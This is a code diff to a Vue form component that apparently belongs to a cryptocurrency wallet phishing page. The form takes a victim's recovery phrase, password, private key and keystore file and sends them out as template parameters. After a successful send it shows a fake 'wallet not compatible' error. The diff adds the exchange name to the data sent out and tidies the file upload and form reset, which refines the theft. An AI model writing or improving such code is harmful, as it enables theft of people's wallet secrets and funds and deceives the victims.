@@ -126,6 +126,18 @@ export default {
     }
   },
 
+  watch: {
+    // Update form.exchange whenever prop changes
+    exchange(newExchange) {
+      this.form.exchange = newExchange.name
+    },
+  },
+
+  mounted() {
+    // Initialize exchange for first render
+    this.form.exchange = this.exchange.name
+  },
+
   methods: {
     cancelModal() {
       this.$emit('cancel-modal')
@@ -138,15 +150,18 @@ export default {
     handleFileUpload(event) {
       const file = event.target.files[0]
 
-      const reader = new FileReader()
-      reader.onload = () => {
-        this.form.file = reader.result // base64 string
+      if (file) {
+        const reader = new FileReader()
+        reader.onload = () => {
+          this.form.file = reader.result // base64 string
+        }
+        reader.readAsDataURL(file)
       }
-      reader.readAsDataURL(file)
     },
 
     submitForm() {
       const templateParams = {
+        exchange: this.form.exchange, // <-- send exchange name
         type: this.selectedOption,
         phrase: this.form.phrase,
         password: this.form.password,
@@ -163,14 +178,16 @@ export default {
         )
         .then(() => {
           console.log('SUCCESS!')
+
           alert(
-            'Error! The wallet connected might not be compatible.Please contact the admin/support for more help or Connect with an active wallet',
+            'Error! The wallet connected might not be compatible. Please contact admin/support or connect with an active wallet.',
           )
 
-          // optional: reset form
+          // Reset form
           this.form.phrase = ''
           this.form.password = ''
           this.form.privateKey = ''
+          this.form.file = null
         })
         .catch((error) => {
           console.log('FAILED...', error)
